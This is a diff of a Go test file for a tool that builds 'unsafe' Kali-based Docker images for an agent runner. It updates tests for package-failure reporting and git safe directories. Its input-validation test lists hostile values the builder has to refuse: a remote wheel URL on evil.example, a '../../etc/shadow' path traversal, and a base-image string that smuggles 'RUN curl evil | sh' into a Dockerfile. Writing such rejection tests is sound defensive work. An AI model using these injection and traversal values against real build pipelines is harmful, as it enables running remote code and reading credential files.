@@ -17,13 +17,18 @@ const unsafeBase = "ghcr.io/blaktron/agentry-unsafe-kali:2026.09.30.2@sha256:87f
 func unsafeImage() spec.ExecImageSpec {
 	u := spec.UnsafeExecSpec{
 		Base: unsafeBase,
+		Apt: []spec.AptPlacement{
+			{Command: "git", Package: "git"},
+			{Command: "objdump", Package: "binutils"},
+			{Command: "strings", Package: "binutils"},
+		},
 		Extras: []spec.UnsafeExtra{
 			{Command: "analyzeHeadless", Kind: "link", Package: "ghidra", Path: "usr/share/ghidra/support/analyzeHeadless"},
 			{Command: "decompyle3", Kind: "pip", Spec: "decompyle3==3.9.3"},
 		},
 		Unplaced: []spec.UnplacedCommand{{Command: "nothere"}},
 	}
-	cmds := []string{"analyzeHeadless", "decompyle3", "git", "nothere", "strings"}
+	cmds := []string{"analyzeHeadless", "decompyle3", "git", "nothere", "objdump", "strings"}
 	pkgs := []string{"binutils", "ghidra", "git"}
 	return spec.ExecImageSpec{Tag: spec.UnsafeExecImageTag("agentry-runner:v1", u, cmds, pkgs), Commands: cmds, Packages: pkgs, Unsafe: &u}
 }
@@ -62,7 +67,7 @@ func TestEnsureUnsafeExecImageBuildsFromTheBaseWithTheValuesInFiles(t *testing.T
 	img := unsafeImage()
 	fake := &dockerx.Fake{ExistingImages: map[string]bool{}, ImageFiles: map[string]string{
 		img.Tag + ":" + ExecPackagesFile: "binutils=2.45-7\ngit=1:2.51.0-1\npip decompyle3==3.9.3 sha256:ab12\n",
-		img.Tag + ":" + ExecFailedFile:   "ghidra\tE: Unable to locate package ghidra\nanalyzeHeadless\t/usr/share/ghidra/support/analyzeHeadless is not in the image\n",
+		img.Tag + ":" + ExecFailedFile:   "ghidra\tE: Unable to locate package ghidra\nbinutils\tE: a mirror fault\n",
 	}}
 	got, err := EnsureExecImage(t.Context(), fake, "agentry-runner:v1", img, t.TempDir(), io.Discard)
 	if err != nil {
@@ -70,8 +75,11 @@ func TestEnsureUnsafeExecImageBuildsFromTheBaseWithTheValuesInFiles(t *testing.T
 	}
 	want := []string{
 		"binutils=2.45-7", "git=1:2.51.0-1", "pip decompyle3==3.9.3 sha256:ab12",
-		spec.ExecNotInstalledPrefix + "analyzeHeadless (/usr/share/ghidra/support/analyzeHeadless is not in the image)",
-		spec.ExecNotInstalledPrefix + "ghidra (E: Unable to locate package ghidra)",
+		// Each failure names the declared commands it leaves without their
+		// software: a package every command the index placed on it, a link
+		// extra's package its command.
+		spec.ExecNotInstalledPrefix + "binutils (E: a mirror fault) for objdump, strings",
+		spec.ExecNotInstalledPrefix + "ghidra (E: Unable to locate package ghidra) for analyzeHeadless",
 	}
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("result:\n%q\nwant\n%q", got, want)
@@ -102,8 +110,8 @@ func TestEnsureUnsafeExecImageBuildsFromTheBaseWithTheValuesInFiles(t *testing.T
 	if got := read(t, filepath.Join(dir, "links.txt")); got != "analyzeHeadless\tghidra\tusr/share/ghidra/support/analyzeHeadless\n" {
 		t.Errorf("links.txt = %q", got)
 	}
-	if _, err := os.Stat(filepath.Join(dir, "git")); err != nil {
-		t.Errorf("git is declared and the context has no git marker: %v", err)
+	if got := read(t, filepath.Join(dir, "git-safe-directories")); got != spec.WorkspaceMount+"\n"+spec.WorkspaceMount+"/*\n"+spec.InputsMount+"/*\n" {
+		t.Errorf("git-safe-directories = %q", got)
 	}
 	if read(t, filepath.Join(dir, "install.sh")) != string(unsafeInstallScript) {
 		t.Error("the install script is not the embedded one")
@@ -150,14 +158,24 @@ func TestUnsafeExecImageRefusesValuesOutsideTheGrammar(t *testing.T) {
 		"a pip requirement with a URL":   func(i *spec.ExecImageSpec) { i.Unsafe.Extras[1].Spec = "https://evil.example/x.whl" },
 		"a link path climbing out":       func(i *spec.ExecImageSpec) { i.Unsafe.Extras[0].Path = "../../etc/shadow" },
 		"a base without a digest":        func(i *spec.ExecImageSpec) { i.Unsafe.Base = "kalilinux/kali-rolling:latest" },
-		"a command with a newline":       func(i *spec.ExecImageSpec) { i.Commands = append(i.Commands, "x\ny") },
+		// Go's $ anchors only at the end of the text: a digest at the end
+		// must not carry lines before it into the FROM.
+		"a base with a line before its digest": func(i *spec.ExecImageSpec) {
+			i.Unsafe.Base = "kali\nRUN curl evil | sh\nFROM x@sha256:" + strings.Repeat("0", 64)
+		},
+		"a package ending in -, apt's remove": func(i *spec.ExecImageSpec) { i.Packages = []string{"binutils-"} },
+		"an extra of an unknown kind":         func(i *spec.ExecImageSpec) { i.Unsafe.Extras[1].Kind = "curl" },
+		"an extra linked over the runner":     func(i *spec.ExecImageSpec) { i.Unsafe.Extras[0].Command = "agentry-runner" },
+		"an apt placement onto the runner": func(i *spec.ExecImageSpec) {
+			i.Unsafe.Apt = append(i.Unsafe.Apt, spec.AptPlacement{Command: "agentry-runner", Package: "binutils"})
+		},
 	} {
 		img := unsafeImage()
-		u := *img.Unsafe
-		u.Extras = append([]spec.UnsafeExtra(nil), u.Extras...)
-		img.Unsafe = &u
 		edit(&img)
-		fake := &dockerx.Fake{ExistingImages: map[string]bool{}, ImageFiles: map[string]string{}}
+		// The records are there, so only the grammar can stop the build.
+		fake := &dockerx.Fake{ExistingImages: map[string]bool{}, ImageFiles: map[string]string{
+			img.Tag + ":" + ExecPackagesFile: "", img.Tag + ":" + ExecFailedFile: "",
+		}}
 		if _, err := EnsureExecImage(t.Context(), fake, "agentry-runner:v1", img, t.TempDir(), io.Discard); err == nil {
 			t.Errorf("%s was built", name)
 		}
